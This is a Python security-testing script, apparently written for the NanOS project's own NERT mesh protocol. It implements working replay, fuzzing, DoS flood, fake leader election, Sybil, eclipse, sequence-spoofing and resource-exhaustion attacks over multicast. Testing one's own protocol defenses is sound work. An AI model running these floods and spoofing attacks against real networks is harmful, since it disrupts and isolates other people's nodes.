#!/usr/bin/env python3
"""
NERT Framework Security Tester
Chaos Monkey for testing security defenses

Copyright (c) 2026 NanOS Project
SPDX-License-Identifier: MIT
"""

import socket
import struct
import time
import random
import argparse
from dataclasses import dataclass
from typing import List, Optional, Dict

# NERT Protocol Constants
NERT_MAGIC = 0x4E
NERT_VERSION = 0x10
NERT_HEADER_SIZE = 20  # Full header for x86: BBHHHHBBHBBxxI (with padding)

# Reliability Classes
CLASS_FIRE_FORGET = 0x00
CLASS_BEST_EFFORT = 0x01
CLASS_RELIABLE = 0x02
CLASS_CRITICAL = 0x03

# Flags
FLAG_SYN = 0x01
FLAG_ACK = 0x02
FLAG_FIN = 0x04
FLAG_RST = 0x08
FLAG_ENC = 0x10
FLAG_FEC = 0x20
FLAG_FRAG = 0x40
FLAG_MPATH = 0x80

# Pheromone Types
PHEROMONE_ECHO = 0x00
PHEROMONE_ANNOUNCE = 0x01
PHEROMONE_ELECTION = 0x02
PHEROMONE_REKEY = 0x03
PHEROMONE_DATA = 0x10
PHEROMONE_ALARM = 0x11
PHEROMONE_DIE = 0x13


@dataclass
class NERTPacket:
    """NERT packet structure"""
    magic: int = NERT_MAGIC
    version_class: int = 0
    node_id: int = 0
    dest_id: int = 0
    seq_num: int = 0
    ack_num: int = 0
    flags: int = 0
    payload_len: int = 0
    timestamp: int = 0
    ttl: int = 15
    hop_count: int = 0
    nonce_counter: int = 0
    payload: bytes = b''
    auth_tag: bytes = b'\x00' * 8

    def pack(self) -> bytes:
        """Pack packet into binary format"""
        header = struct.pack(
            '<BBHHHHBBHBBI',
            self.magic,
            self.version_class,
            self.node_id,
            self.dest_id,
            self.seq_num,
            self.ack_num,
            self.flags,
            self.payload_len,
            self.timestamp,
            self.ttl,
            self.hop_count,
            self.nonce_counter
        )
        return header + self.payload[:self.payload_len] + self.auth_tag

    @staticmethod
    def unpack(data: bytes) -> Optional['NERTPacket']:
        """Unpack binary data into packet"""
        if len(data) < NERT_HEADER_SIZE:
            return None

        header = struct.unpack('<BBHHHHBBHBBI', data[:NERT_HEADER_SIZE])
        pkt = NERTPacket(
            magic=header[0],
            version_class=header[1],
            node_id=header[2],
            dest_id=header[3],
            seq_num=header[4],
            ack_num=header[5],
            flags=header[6],
            payload_len=header[7],
            timestamp=header[8],
            ttl=header[9],
            hop_count=header[10],
            nonce_counter=header[11]
        )

        payload_end = NERT_HEADER_SIZE + pkt.payload_len
        if len(data) >= payload_end:
            pkt.payload = data[NERT_HEADER_SIZE:payload_end]

        if len(data) >= payload_end + 8:
            pkt.auth_tag = data[payload_end:payload_end + 8]

        return pkt


class NERTAttacker:
    """Security testing tool for NERT protocol"""

    def __init__(self, multicast_group: str, port: int, attacker_id: int = 0xDEAD):
        self.multicast_group = multicast_group
        self.port = port
        self.attacker_id = attacker_id

        # Create socket
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

        # Join multicast group
        self.sock.bind(('', port))
        mreq = struct.pack('4sL', socket.inet_aton(multicast_group), socket.INADDR_ANY)
        self.sock.setsockopt(socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP, mreq)

        # Set non-blocking
        self.sock.setblocking(False)

        # Packet capture buffer
        self.captured_packets: List[NERTPacket] = []

        print(f"[Attacker {attacker_id:04X}] Listening on {multicast_group}:{port}")

    def send_packet(self, pkt: NERTPacket):
        """Send a packet to the multicast group"""
        data = pkt.pack()
        self.sock.sendto(data, (self.multicast_group, self.port))
        print(f"[Attacker {self.attacker_id:04X}] Sent {len(data)} bytes")

    def capture_packets(self, duration: float = 2.0) -> List[NERTPacket]:
        """Capture packets for analysis"""
        print(f"[Attacker {self.attacker_id:04X}] Capturing packets for {duration}s...")
        start = time.time()
        captured = []

        while time.time() - start < duration:
            try:
                data, addr = self.sock.recvfrom(65535)
                pkt = NERTPacket.unpack(data)
                if pkt:
                    captured.append(pkt)
                    print(f"  Captured from {pkt.node_id:04X}: "
                          f"seq={pkt.seq_num}, len={pkt.payload_len}")
            except BlockingIOError:
                time.sleep(0.01)

        print(f"[Attacker {self.attacker_id:04X}] Captured {len(captured)} packets")
        self.captured_packets.extend(captured)
        return captured

    def attack_replay(self, count: int = 10):
        """Replay attack - resend captured packets"""
        print(f"\n[ATTACK] Replay Attack - replaying {count} packets")

        if not self.captured_packets:
            print("  No packets to replay. Capturing first...")
            self.capture_packets(3.0)

        if not self.captured_packets:
            print("  No packets captured!")
            return

        for i in range(min(count, len(self.captured_packets))):
            pkt = self.captured_packets[i % len(self.captured_packets)]
            print(f"  Replaying packet {i + 1}/{count}: "
                  f"node_id={pkt.node_id:04X}, seq={pkt.seq_num}")
            self.send_packet(pkt)
            time.sleep(0.1)

    def attack_fuzzing(self, count: int = 20):
        """Fuzzing attack - send malformed packets"""
        print(f"\n[ATTACK] Fuzzing Attack - sending {count} malformed packets")

        for i in range(count):
            pkt = NERTPacket()
            pkt.node_id = self.attacker_id
            pkt.seq_num = random.randint(0, 65535)
            pkt.version_class = (NERT_VERSION & 0xF0) | (random.randint(0, 3) << 2)
            pkt.flags = FLAG_ENC
            pkt.nonce_counter = random.randint(0, 2**32 - 1)

            # Generate malicious payloads
            attack_type = i % 5

            if attack_type == 0:
                # Oversized payload
                pkt.payload = bytes([random.randint(0, 255) for _ in range(300)])
                pkt.payload_len = 255  # Lie about size
                print(f"  Fuzz {i + 1}: Oversized payload (actual 300, claimed 255)")

            elif attack_type == 1:
                # Undersized payload
                pkt.payload = b'\x00'
                pkt.payload_len = 50  # Claim more than we have
                print(f"  Fuzz {i + 1}: Undersized payload (actual 1, claimed 50)")

            elif attack_type == 2:
                # Invalid magic number
                pkt.magic = random.randint(0, 255)
                pkt.payload = b'\xDE\xAD\xBE\xEF'
                pkt.payload_len = 4
                print(f"  Fuzz {i + 1}: Invalid magic (0x{pkt.magic:02X})")

            elif attack_type == 3:
                # All zeros
                pkt.payload = b'\x00' * 32
                pkt.payload_len = 32
                print(f"  Fuzz {i + 1}: All-zero payload")

            else:
                # Random binary junk
                pkt.payload = bytes([random.randint(0, 255) for _ in range(64)])
                pkt.payload_len = 64
                print(f"  Fuzz {i + 1}: Random binary junk")

            self.send_packet(pkt)
            time.sleep(0.05)

    def attack_fake_queen(self, duration: float = 10.0):
        """Fake Queen attack - announce as highest priority node"""
        print(f"\n[ATTACK] Fake Queen Attack - duration {duration}s")

        start = time.time()
        election_count = 0

        while time.time() - start < duration:
            pkt = NERTPacket()
            pkt.node_id = 0xFFFF  # Highest possible ID
            pkt.seq_num = election_count
            pkt.version_class = (NERT_VERSION & 0xF0) | (CLASS_BEST_EFFORT << 2)
            pkt.flags = FLAG_ENC
            pkt.nonce_counter = election_count

            # Fake election message (encrypted garbage)
            payload = struct.pack('<HHI', 0xFFFF, 0xFFFF, 0xFFFFFFFF)
            pkt.payload = payload
            pkt.payload_len = len(payload)

            print(f"  Announcing fake Queen (ID=0xFFFF, priority=MAX)")
            self.send_packet(pkt)

            election_count += 1
            time.sleep(1.0)

    def attack_dos(self, duration: float = 5.0, rate: int = 100):
        """DoS attack - flood the network"""
        print(f"\n[ATTACK] DoS Attack - {rate} packets/sec for {duration}s")

        start = time.time()
        sent = 0

        while time.time() - start < duration:
            batch_start = time.time()

            for _ in range(rate // 10):  # Send in batches
                pkt = NERTPacket()
                pkt.node_id = self.attacker_id
                pkt.seq_num = sent
                pkt.version_class = (NERT_VERSION & 0xF0) | (CLASS_FIRE_FORGET << 2)
                pkt.flags = FLAG_ENC
                pkt.nonce_counter = sent
                pkt.payload = b'\xFF' * 64
                pkt.payload_len = 64

                self.send_packet(pkt)
                sent += 1

            # Rate limiting
            elapsed = time.time() - batch_start
            sleep_time = 0.1 - elapsed
            if sleep_time > 0:
                time.sleep(sleep_time)

        print(f"  Sent {sent} packets")

    def attack_timing(self, target_id: int = 0, samples: int = 100):
        """Timing attack - measure response times to correlate with key material

        This attack attempts to:
        1. Send carefully crafted packets with different payloads
        2. Measure response times to the microsecond
        3. Look for statistical patterns that might leak key information
        """
        print(f"\n[ATTACK] Timing Attack - {samples} samples")
        print(f"  Target: {target_id:04X if target_id else 'broadcast'}")

        response_times: Dict[int, List[float]] = {}  # pattern -> response times

        # Test different payload patterns
        patterns = [
            (0x00, b'\x00' * 16),  # All zeros
            (0x01, b'\xFF' * 16),  # All ones
            (0x02, b'\xAA' * 16),  # Alternating bits
            (0x03, b'\x55' * 16),  # Inverse alternating
            (0x04, bytes(range(16))),  # Sequential
            (0x05, bytes([random.randint(0, 255) for _ in range(16)])),  # Random
        ]

        for pattern_id, pattern_data in patterns:
            response_times[pattern_id] = []

        print(f"  Testing {len(patterns)} payload patterns...")

        for i in range(samples):
            for pattern_id, pattern_data in patterns:
                pkt = NERTPacket()
                pkt.node_id = self.attacker_id
                pkt.dest_id = target_id
                pkt.seq_num = i * len(patterns) + pattern_id
                pkt.version_class = (NERT_VERSION & 0xF0) | (CLASS_BEST_EFFORT << 2)
                pkt.flags = FLAG_ENC
                pkt.nonce_counter = random.randint(0, 2**32 - 1)
                pkt.payload = pattern_data
                pkt.payload_len = len(pattern_data)

                # High-precision timing
                send_time = time.perf_counter_ns()
                self.send_packet(pkt)

                # Wait for potential response
                response_received = False
                deadline = time.time() + 0.1  # 100ms timeout

                while time.time() < deadline:
                    try:
                        data, addr = self.sock.recvfrom(65535)
                        recv_time = time.perf_counter_ns()

                        response_pkt = NERTPacket.unpack(data)
                        if response_pkt and response_pkt.dest_id == self.attacker_id:
                            elapsed_ns = recv_time - send_time
                            response_times[pattern_id].append(elapsed_ns)
                            response_received = True
                            break
                    except BlockingIOError:
                        time.sleep(0.001)

                if not response_received:
                    response_times[pattern_id].append(-1)  # No response

                time.sleep(0.01)  # Small delay between tests

        # Analyze results
        print("\n  Timing Analysis:")
        print("  " + "-" * 50)

        for pattern_id, times in response_times.items():
            valid_times = [t for t in times if t > 0]
            if valid_times:
                avg_ns = sum(valid_times) / len(valid_times)
                min_ns = min(valid_times)
                max_ns = max(valid_times)
                variance = sum((t - avg_ns) ** 2 for t in valid_times) / len(valid_times)
                std_dev = variance ** 0.5

                print(f"  Pattern 0x{pattern_id:02X}:")
                print(f"    Responses: {len(valid_times)}/{samples}")
                print(f"    Avg: {avg_ns/1000:.1f}us, Min: {min_ns/1000:.1f}us, Max: {max_ns/1000:.1f}us")
                print(f"    Std Dev: {std_dev/1000:.1f}us")
            else:
                print(f"  Pattern 0x{pattern_id:02X}: No responses")

        # Check for timing differences
        valid_averages = []
        for pattern_id, times in response_times.items():
            valid_times = [t for t in times if t > 0]
            if valid_times:
                valid_averages.append((pattern_id, sum(valid_times) / len(valid_times)))

        if len(valid_averages) >= 2:
            sorted_avgs = sorted(valid_averages, key=lambda x: x[1])
            diff_percent = (sorted_avgs[-1][1] - sorted_avgs[0][1]) / sorted_avgs[0][1] * 100
            print(f"\n  Max timing difference: {diff_percent:.2f}%")
            if diff_percent > 10:
                print("  [!] POTENTIAL TIMING LEAK DETECTED")
            else:
                print("  [OK] No significant timing variation")

    def attack_sybil(self, num_identities: int = 20, duration: float = 30.0):
        """Sybil attack - create multiple fake node identities to dominate routing

        This attack attempts to:
        1. Create many fake node IDs
        2. Announce all of them repeatedly
        3. Attempt to dominate routing decisions
        4. Intercept traffic by positioning in routing paths
        """
        print(f"\n[ATTACK] Sybil Attack - {num_identities} fake identities for {duration}s")

        # Generate fake node IDs
        fake_ids = [random.randint(0x1000, 0xFFFE) for _ in range(num_identities)]
        print(f"  Generated IDs: {', '.join(f'{fid:04X}' for fid in fake_ids[:5])}...")

        start = time.time()
        announce_count = 0
        intercepted = 0

        # Create socket for each "fake node" (share the actual socket)
        seq_nums = {fid: 0 for fid in fake_ids}

        while time.time() - start < duration:
            # Round-robin announce from each fake identity
            for fake_id in fake_ids:
                # Send ANNOUNCE
                pkt = NERTPacket()
                pkt.node_id = fake_id
                pkt.dest_id = 0  # Broadcast
                pkt.seq_num = seq_nums[fake_id]
                pkt.version_class = (NERT_VERSION & 0xF0) | (CLASS_BEST_EFFORT << 2)
                pkt.flags = FLAG_ENC
                pkt.nonce_counter = random.randint(0, 2**32 - 1)

                # Fake announce payload: [node_id:2][priority:2]
                # Use high priority to try to become "important"
                priority = 0xFFFF - (fake_id % 100)  # High priorities
                pkt.payload = struct.pack('<HH', fake_id, priority)
                pkt.payload_len = 4

                self.send_packet(pkt)
                seq_nums[fake_id] = (seq_nums[fake_id] + 1) & 0xFFFF
                announce_count += 1

            # Also send ELECTION packets to try to influence Queen election
            leader_id = random.choice(fake_ids)
            pkt = NERTPacket()
            pkt.node_id = leader_id
            pkt.dest_id = 0
            pkt.seq_num = seq_nums[leader_id]
            pkt.version_class = (NERT_VERSION & 0xF0) | (CLASS_RELIABLE << 2)
            pkt.flags = FLAG_ENC
            pkt.nonce_counter = random.randint(0, 2**32 - 1)
            pkt.payload = struct.pack('<HH', leader_id, 0xFFFF)  # Max priority
            pkt.payload_len = 4

            self.send_packet(pkt)
            announce_count += 1

            # Try to intercept traffic
            try:
                data, addr = self.sock.recvfrom(65535)
                recv_pkt = NERTPacket.unpack(data)
                if recv_pkt and recv_pkt.node_id not in fake_ids:
                    intercepted += 1
                    # Could analyze/modify traffic here
            except BlockingIOError:
                pass

            time.sleep(0.05)  # ~20 rounds per second

        print(f"  Announcements sent: {announce_count}")
        print(f"  Packets intercepted: {intercepted}")
        print(f"  Fake identities active: {num_identities}")

    def attack_eclipse(self, target_id: int, num_attackers: int = 8, duration: float = 60.0):
        """Eclipse attack - surround target node with attacker nodes to isolate it

        This attack attempts to:
        1. Create multiple attacker identities around the target
        2. Claim to be the best path to all destinations
        3. Flood the target's neighbor table with attacker nodes
        4. Intercept and optionally drop/modify all traffic
        """
        print(f"\n[ATTACK] Eclipse Attack on {target_id:04X}")
        print(f"  Attacker nodes: {num_attackers}, Duration: {duration}s")

        # Generate attacker IDs close to target (to appear as neighbors)
        attacker_ids = []
        for i in range(num_attackers):
            # Generate IDs that hash close to target
            aid = (target_id + i * 0x100) & 0xFFFF
            if aid == 0 or aid == target_id:
                aid = 0x1000 + i
            attacker_ids.append(aid)

        print(f"  Attacker IDs: {', '.join(f'{aid:04X}' for aid in attacker_ids)}")

        start = time.time()
        seq_nums = {aid: 0 for aid in attacker_ids}

        # Statistics
        stats = {
            'announces': 0,
            'targeted_packets': 0,
            'intercepted': 0,
            'dropped': 0,
            'forwarded': 0,
        }

        while time.time() - start < duration:
            phase = (time.time() - start) % 10  # 10-second phases

            for attacker_id in attacker_ids:
                # Phase 1: Flood with announcements (0-3s)
                if phase < 3:
                    pkt = NERTPacket()
                    pkt.node_id = attacker_id
                    pkt.dest_id = 0  # Broadcast to appear everywhere
                    pkt.seq_num = seq_nums[attacker_id]
                    pkt.version_class = (NERT_VERSION & 0xF0) | (CLASS_BEST_EFFORT << 2)
                    pkt.flags = FLAG_ENC
                    pkt.nonce_counter = random.randint(0, 2**32 - 1)

                    # Announce with optimal routing claims
                    # [node_id:2][priority:2][distance_to_queen:1][...capabilities...]
                    pkt.payload = struct.pack('<HHBB', attacker_id, 0xFFF0, 1, 0xFF)
                    pkt.payload_len = 6

                    self.send_packet(pkt)
                    seq_nums[attacker_id] = (seq_nums[attacker_id] + 1) & 0xFFFF
                    stats['announces'] += 1

                # Phase 2: Send fake "routing updates" to target (3-6s)
                elif phase < 6:
                    pkt = NERTPacket()
                    pkt.node_id = attacker_id
                    pkt.dest_id = target_id  # Directly to target
                    pkt.seq_num = seq_nums[attacker_id]
                    pkt.version_class = (NERT_VERSION & 0xF0) | (CLASS_RELIABLE << 2)
                    pkt.flags = FLAG_ENC
                    pkt.nonce_counter = random.randint(0, 2**32 - 1)

                    # Fake neighbor table update
                    pkt.payload = struct.pack('<HHHH',
                        attacker_id,  # "I am your neighbor"
                        1,  # Distance 1 (direct)
                        0xFF,  # High quality link
                        0  # Reserved
                    )
                    pkt.payload_len = 8

                    self.send_packet(pkt)
                    seq_nums[attacker_id] = (seq_nums[attacker_id] + 1) & 0xFFFF
                    stats['targeted_packets'] += 1

                # Phase 3: Intercept and analyze (6-10s)
                else:
                    pass  # Just receive and analyze

            # Receive and process traffic
            for _ in range(10):  # Check multiple times per loop
                try:
                    data, addr = self.sock.recvfrom(65535)
                    recv_pkt = NERTPacket.unpack(data)

                    if recv_pkt:
                        # Check if this is traffic to/from target
                        if recv_pkt.dest_id == target_id or recv_pkt.node_id == target_id:
                            stats['intercepted'] += 1

                            # Decide whether to drop or forward
                            if random.random() < 0.3:  # 30% drop rate
                                stats['dropped'] += 1
                            else:
                                # Forward (in real attack, could modify)
                                stats['forwarded'] += 1
                                # self.send_packet(recv_pkt)  # Would relay

                except BlockingIOError:
                    break

            time.sleep(0.02)

        print(f"\n  Eclipse Attack Results:")
        print(f"    Announcements: {stats['announces']}")
        print(f"    Targeted packets: {stats['targeted_packets']}")
        print(f"    Traffic intercepted: {stats['intercepted']}")
        print(f"    Packets dropped: {stats['dropped']}")
        print(f"    Packets forwarded: {stats['forwarded']}")

        isolation_rate = stats['dropped'] / max(stats['intercepted'], 1) * 100
        print(f"    Isolation rate: {isolation_rate:.1f}%")

    def attack_sequence_prediction(self, target_id: int = 0, samples: int = 50):
        """Sequence prediction attack - try to predict next sequence numbers

        If sequence numbers are predictable, attacker can:
        1. Pre-compute valid packets
        2. Race legitimate packets
        3. Inject malicious responses
        """
        print(f"\n[ATTACK] Sequence Prediction Attack - {samples} samples")

        observed_seqs: Dict[int, List[int]] = {}  # node_id -> list of observed seqs

        print("  Collecting sequence numbers...")

        # Capture traffic
        start = time.time()
        while time.time() - start < 10.0:
            try:
                data, addr = self.sock.recvfrom(65535)
                pkt = NERTPacket.unpack(data)
                if pkt and pkt.node_id != self.attacker_id:
                    if pkt.node_id not in observed_seqs:
                        observed_seqs[pkt.node_id] = []
                    observed_seqs[pkt.node_id].append(pkt.seq_num)
            except BlockingIOError:
                time.sleep(0.01)

        # Analyze patterns
        print("\n  Sequence Analysis:")
        print("  " + "-" * 50)

        for node_id, seqs in observed_seqs.items():
            if len(seqs) < 3:
                continue

            print(f"\n  Node {node_id:04X} ({len(seqs)} samples):")
            print(f"    Sequences: {seqs[:10]}{'...' if len(seqs) > 10 else ''}")

            # Check for simple increment
            increments = []
            for i in range(1, len(seqs)):
                inc = (seqs[i] - seqs[i-1]) & 0xFFFF
                increments.append(inc)

            if increments:
                avg_inc = sum(increments) / len(increments)
                is_sequential = all(inc == 1 for inc in increments)
                is_predictable = len(set(increments)) <= 2

                print(f"    Avg increment: {avg_inc:.2f}")
                print(f"    Sequential (inc=1): {is_sequential}")
                print(f"    Predictable: {is_predictable}")

                if is_predictable:
                    next_predicted = (seqs[-1] + int(avg_inc)) & 0xFFFF
                    print(f"    [!] PREDICTED NEXT: {next_predicted}")

                    # Try to race with predicted sequence
                    print(f"    Attempting sequence race...")

                    pkt = NERTPacket()
                    pkt.node_id = node_id  # Spoof source
                    pkt.dest_id = target_id
                    pkt.seq_num = next_predicted
                    pkt.version_class = (NERT_VERSION & 0xF0) | (CLASS_RELIABLE << 2)
                    pkt.flags = FLAG_ENC
                    pkt.nonce_counter = random.randint(0, 2**32 - 1)
                    pkt.payload = b'\x00' * 16
                    pkt.payload_len = 16

                    self.send_packet(pkt)
                    print(f"    Sent spoofed packet with seq={next_predicted}")

    def attack_resource_exhaustion(self, duration: float = 30.0):
        """Resource exhaustion attack - try to exhaust node resources

        Targets:
        1. Reassembly buffers (send fragments that never complete)
        2. Connection table (open many fake connections)
        3. Rate limit buckets (force tracking of many nodes)
        4. AIS detector memory (trigger many false positives)
        """
        print(f"\n[ATTACK] Resource Exhaustion Attack - {duration}s")

        start = time.time()
        fake_src_count = 0
        frag_count = 0
        conn_count = 0

        while time.time() - start < duration:
            attack_type = random.randint(0, 3)

            if attack_type == 0:
                # Fragment exhaustion - send first fragment, never complete
                fake_src = 0x2000 + fake_src_count
                fake_src_count = (fake_src_count + 1) % 1000

                pkt = NERTPacket()
                pkt.node_id = fake_src
                pkt.dest_id = 0
                pkt.seq_num = frag_count
                pkt.version_class = (NERT_VERSION & 0xF0) | (CLASS_RELIABLE << 2)
                pkt.flags = FLAG_ENC | FLAG_FRAG
                pkt.nonce_counter = frag_count

                # Fragment header: [msg_id:1][frag_index:1][frag_total:1]
                # Send frag 0 of 8, never send the rest
                pkt.payload = struct.pack('<BBB', frag_count & 0xFF, 0, 8) + b'\x00' * 32
                pkt.payload_len = 35

                self.send_packet(pkt)
                frag_count += 1

            elif attack_type == 1:
                # Connection table exhaustion - send SYN from many sources
                fake_src = 0x3000 + conn_count
                conn_count = (conn_count + 1) % 500

                pkt = NERTPacket()
                pkt.node_id = fake_src
                pkt.dest_id = 0
                pkt.seq_num = random.randint(0, 65535)
                pkt.version_class = (NERT_VERSION & 0xF0) | (CLASS_RELIABLE << 2)
                pkt.flags = FLAG_SYN | FLAG_ENC
                pkt.nonce_counter = random.randint(0, 2**32 - 1)
                pkt.payload = b'\x00' * 8
                pkt.payload_len = 8

                self.send_packet(pkt)

            elif attack_type == 2:
                # Rate limit bucket exhaustion - packets from many unique sources
                fake_src = random.randint(0x4000, 0xFFFF)

                pkt = NERTPacket()
                pkt.node_id = fake_src
                pkt.dest_id = 0
                pkt.seq_num = 0
                pkt.version_class = (NERT_VERSION & 0xF0) | (CLASS_FIRE_FORGET << 2)
                pkt.flags = FLAG_ENC
                pkt.nonce_counter = 0
                pkt.payload = b'\xFF' * 16
                pkt.payload_len = 16

                self.send_packet(pkt)

            elif attack_type == 3:
                # AIS trigger - send packets that look anomalous
                pkt = NERTPacket()
                pkt.node_id = self.attacker_id
                pkt.dest_id = 0
                pkt.seq_num = random.randint(0, 65535)
                pkt.version_class = (NERT_VERSION & 0xF0) | (CLASS_FIRE_FORGET << 2)
                pkt.flags = FLAG_ENC
                pkt.nonce_counter = random.randint(0, 2**32 - 1)

                # Send "suspicious" patterns that might trigger AIS
                patterns = [
                    b'\x90' * 32,  # NOP sled
                    b'\xCC' * 32,  # INT3 breakpoints
                    b'\xEB\xFE' * 16,  # JMP self loops
                    struct.pack('<I', 0x7FFE0300) * 8,  # Syscall addresses
                ]
                pkt.payload = random.choice(patterns)
                pkt.payload_len = len(pkt.payload)

                self.send_packet(pkt)

            time.sleep(0.01)

        elapsed = time.time() - start
        print(f"  Attack completed in {elapsed:.1f}s")
        print(f"  Incomplete fragments sent: {frag_count}")
        print(f"  Fake SYN connections: {conn_count}")
        print(f"  Unique source IDs used: {fake_src_count}")

    def close(self):
        """Clean up"""
        self.sock.close()


def main():
    parser = argparse.ArgumentParser(
        description='NERT Framework Security Tester',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Capture and replay packets
  %(prog)s --attack replay --capture 5

  # Fuzz the protocol
  %(prog)s --attack fuzzing --count 50

  # Fake Queen election attack
  %(prog)s --attack fake-queen --duration 30

  # DoS flood
  %(prog)s --attack dos --duration 10 --rate 200

  # Timing attack (correlate response times)
  %(prog)s --attack timing --target 1001 --samples 200

  # Sybil attack (multiple fake identities)
  %(prog)s --attack sybil --identities 30 --duration 60

  # Eclipse attack (isolate target node)
  %(prog)s --attack eclipse --target 1001 --identities 16 --duration 120

  # Sequence prediction attack
  %(prog)s --attack sequence --samples 50

  # Resource exhaustion attack
  %(prog)s --attack exhaustion --duration 60
        """
    )

    parser.add_argument('--multicast', default='239.255.0.1',
                        help='Multicast group (default: 239.255.0.1)')
    parser.add_argument('--port', type=int, default=5555,
                        help='Port (default: 5555)')
    parser.add_argument('--attacker-id', type=lambda x: int(x, 16), default=0xDEAD,
                        help='Attacker node ID in hex (default: DEAD)')

    parser.add_argument('--attack', required=True,
                        choices=['replay', 'fuzzing', 'fake-queen', 'dos', 'timing',
                                 'sybil', 'eclipse', 'sequence', 'exhaustion', 'all'],
                        help='Attack type to execute')

    parser.add_argument('--capture', type=float, default=2.0,
                        help='Packet capture duration in seconds (default: 2)')
    parser.add_argument('--count', type=int, default=20,
                        help='Number of packets/iterations (default: 20)')
    parser.add_argument('--duration', type=float, default=10.0,
                        help='Attack duration in seconds (default: 10)')
    parser.add_argument('--rate', type=int, default=100,
                        help='DoS rate in packets/sec (default: 100)')
    parser.add_argument('--target', type=lambda x: int(x, 16), default=0,
                        help='Target node ID in hex for targeted attacks (default: 0=broadcast)')
    parser.add_argument('--identities', type=int, default=20,
                        help='Number of fake identities for Sybil attack (default: 20)')
    parser.add_argument('--samples', type=int, default=100,
                        help='Number of samples for timing/sequence attacks (default: 100)')

    args = parser.parse_args()

    print("╔════════════════════════════════════════════════╗")
    print("║   NERT Security Tester - Chaos Monkey         ║")
    print("╚════════════════════════════════════════════════╝\n")
    print(f"Target: {args.multicast}:{args.port}")
    print(f"Attacker ID: 0x{args.attacker_id:04X}\n")

    attacker = NERTAttacker(args.multicast, args.port, args.attacker_id)

    try:
        if args.attack == 'replay' or args.attack == 'all':
            attacker.capture_packets(args.capture)
            attacker.attack_replay(args.count)

        if args.attack == 'fuzzing' or args.attack == 'all':
            attacker.attack_fuzzing(args.count)

        if args.attack == 'fake-queen' or args.attack == 'all':
            attacker.attack_fake_queen(args.duration)

        if args.attack == 'dos' or args.attack == 'all':
            attacker.attack_dos(args.duration, args.rate)

        if args.attack == 'timing' or args.attack == 'all':
            attacker.attack_timing(args.target, args.samples)

        if args.attack == 'sybil' or args.attack == 'all':
            attacker.attack_sybil(args.identities, args.duration)

        if args.attack == 'eclipse' or args.attack == 'all':
            if args.target == 0:
                print("[WARN] Eclipse attack requires --target. Using 0x1001.")
                target = 0x1001
            else:
                target = args.target
            attacker.attack_eclipse(target, args.identities // 2, args.duration)

        if args.attack == 'sequence' or args.attack == 'all':
            attacker.attack_sequence_prediction(args.target, args.samples)

        if args.attack == 'exhaustion' or args.attack == 'all':
            attacker.attack_resource_exhaustion(args.duration)

        if args.attack == 'all':
            print("\n[INFO] All attacks completed")

    except KeyboardInterrupt:
        print("\n[INFO] Attack interrupted by user")

    finally:
        attacker.close()
        print("\n[INFO] Attacker shutdown complete")


if __name__ == '__main__':
    main()
